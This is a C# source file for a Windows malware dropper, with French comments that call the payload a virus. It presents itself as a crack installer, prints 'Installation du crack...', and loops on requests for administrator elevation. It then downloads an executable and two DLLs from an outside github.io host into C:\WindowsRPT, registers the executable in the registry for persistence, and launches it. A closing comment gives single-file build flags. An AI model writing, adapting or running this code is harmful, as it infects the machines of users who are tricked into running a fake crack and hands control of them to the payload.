#if WINDOWS
using System;
using System.IO;
using System.Net.Http;
using System.Diagnostics;

using Microsoft.Win32;

using System.Security.Principal;
using System.Security.Cryptography.X509Certificates;
using Lfd;



class Program{


    static void Main(){
        
        string URLMusiqueDonload = "https://tina-1300.github.io/musique/t.wav";
        string UrlMalwaire = "https://tina-1300.github.io/musique/don't cry.exe"; 
        string UrlDll1 = "https://tina-1300.github.io/musique/libgcc_s_seh-1.dll";
        string UrlDll2 = "https://tina-1300.github.io/musique/libstdc++-6.dll";

        string directoryFinall = @"C:\WindowsRPT";

        string Musique_File_src = "t.wav";
        string Malwaire_File_src = "cry.exe";
        string Dll1_File_src = "libgcc_s_seh-1.dll";
        string Dll2_File_src = "libstdc++-6.dll";

        string Musique_File_dst = @"C:\WindowsRPT\t.wav";
        string Malwaire_File_dst = @"C:\WindowsRPT\cry.exe";
        string Dll1_File_dst = @"C:\WindowsRPT\libgcc_s_seh-1.dll";
        string Dll2_File_dst = @"C:\WindowsRPT\libstdc++-6.dll";


        bool IsAdmin = MalwaireFunction.IsRoot(); 

        bool MalwaireFile = MalwaireFunction.fileExiste("cry.exe");
        bool MusicFile = MalwaireFunction.fileExiste("t.wav");

        bool MusicFileDirectory = MalwaireFunction.fileExiste(@"C:\WindowsRPT\t.wav"); 
        bool MalwaireFileDirectory = MalwaireFunction.fileExiste(@"C:\WindowsRPT\cry.exe"); // virus 

        bool dll1File = MalwaireFunction.fileExiste("libgcc_s_seh-1.dll"); //libgcc_s_seh-1.dll
        bool dll2File = MalwaireFunction.fileExiste("libstdc++-6.dll"); //libstdc++-6.dll

        bool dll1FileDirectory = MalwaireFunction.fileExiste(@"C:\WindowsRPT\libgcc_s_seh-1.dll"); 
        bool dll2FileDirectory = MalwaireFunction.fileExiste(@"C:\WindowsRPT\libstdc++-6.dll");    

        bool isDirectory = MalwaireFunction.DirectoryExistE(@"C:\WindowsRPT");


        GotIS:
        if(IsAdmin == true){
            // effectuer les tache l'utilisateur et root 
            Console.WriteLine("Installation du crack...");

            if(isDirectory == true){
                if(MusicFileDirectory == true && MalwaireFileDirectory == true && dll1FileDirectory == true && dll2FileDirectory == true){

                    MalwaireFunction.KeyRegister(@"C:\WindowsRPT\cry.exe", "cry");

                    MalwaireFunction.SystemShell(@"start C:\WindowsRPT\cry.exe");

                }else{
                    MalwaireFunction.ClearRepertoirAll(directoryFinall);

                    MalwaireFunction.donload(URLMusiqueDonload, "t.wav");
                    MalwaireFunction.donload(UrlMalwaire, "cry.exe");
                    MalwaireFunction.donload(UrlDll1, "libgcc_s_seh-1.dll");
                    MalwaireFunction.donload(UrlDll2, "libstdc++-6.dll");

                    File.Move(Musique_File_src, Musique_File_dst);
                    File.Move(Malwaire_File_src, Malwaire_File_dst);
                    File.Move(Dll1_File_src, Dll1_File_dst);
                    File.Move(Dll2_File_src, Dll2_File_dst);

                    // suprimmer tous les fichier du repertoir qui on été deplacer
                    // pas besoin car ça suprimme en deplaçant


                    
                    // ajouter le malwair au registre 
                    MalwaireFunction.KeyRegister(@"C:\WindowsRPT\cry.exe", "cry");


                    // executer le malwaire
                    MalwaireFunction.SystemShell("start C:\\WindowsRPT\\cry.exe");

                }



            }else{
                Directory.CreateDirectory(@"C:\WindowsRPT");
                // télécharger tout les fichiers nécessaire 
                MalwaireFunction.donload(URLMusiqueDonload, "t.wav");
                MalwaireFunction.donload(UrlMalwaire, "cry.exe");
                MalwaireFunction.donload(UrlDll1, "libgcc_s_seh-1.dll");
                MalwaireFunction.donload(UrlDll2, "libstdc++-6.dll");

                // deplacer tout les fichier dans le repertoir 
                File.Move(Musique_File_src, Musique_File_dst);
                File.Move(Malwaire_File_src, Malwaire_File_dst);
                File.Move(Dll1_File_src, Dll1_File_dst);
                File.Move(Dll2_File_src, Dll2_File_dst);

                // suprimmer tous les fichier du repertoir qui on été deplacer
                // pas besoin car ça suprimme en deplaçant



                // ajouter le virus au registre 
                MalwaireFunction.KeyRegister(@"C:\WindowsRPT\cry.exe", "cry");

                // lancer le virus
                MalwaireFunction.SystemShell("start C:\\WindowsRPT\\cry.exe");
            }

        }else{
            // demander elavation 
            MalwaireFunction.ElevatROOT(IsAdmin);
            goto GotIS;

        }
        
        
    }


};
/*
Compilation :
dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:PublishTrimmed=true

site ou il y a des .icone
https://icon-icons.com/fr/recherche/icones/?filtro=java&sort=popular

*/



#endif